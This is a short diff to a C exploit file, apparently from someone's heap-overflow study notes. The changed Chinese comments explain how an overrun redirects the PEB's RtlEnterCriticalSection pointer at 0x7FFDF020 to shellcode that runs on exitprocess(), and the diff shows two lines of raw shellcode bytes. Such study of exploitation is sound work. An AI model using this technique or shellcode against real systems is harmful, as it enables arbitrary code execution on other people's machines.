@@ -7,7 +7,9 @@ char shellcode[]=
     
     //repaire the pointer which shooted by heap over run  此处还要将P.E.B块中偏移0x20地址7FFDF020修改成正确的地址是因为：在堆覆盖后，进行h2分配
     //时，需要将尾块从Freelist[0]中卸下来，由卸下一个node的规则（参考笔记中5.3.2），会将卸下来节点node的flink的值写入到blink地址中，即本shellcode
-    //的最后8字节，将0x00520688写入到0x7ffdf020地址中，即完成调用exitprocess()时，会跳转到shellcode的入口地址0x00520688，而跳转到shellcode之后
+    //的最后8字节，将0x00520688写入到0x7ffdf020地址中，当程序正常执行结束需要退出时，进行调用exitprocess()，而时exitprocess()会执行
+    //RtlEnterCriticalSection函数，因此会跳到RtlEnterCriticalSection的地址，而RtlEnterCriticalSection的地址已经被上面覆盖，因此才会跳转到
+    //shellcode的入口地址0x00520688，而跳转到shellcode之后
     //我们希望shellcode能够正常运行，所以将RtlEnterCriticalSection的地址重新修改过来
     "\xB8\x20\xF0\xFD\x7F"  //MOV EAX,7FFDF020
     "\xBB\x03\x91\xF8\x77"  //MOV EBX,77F89103/77F89134 the address here may releated to your OS
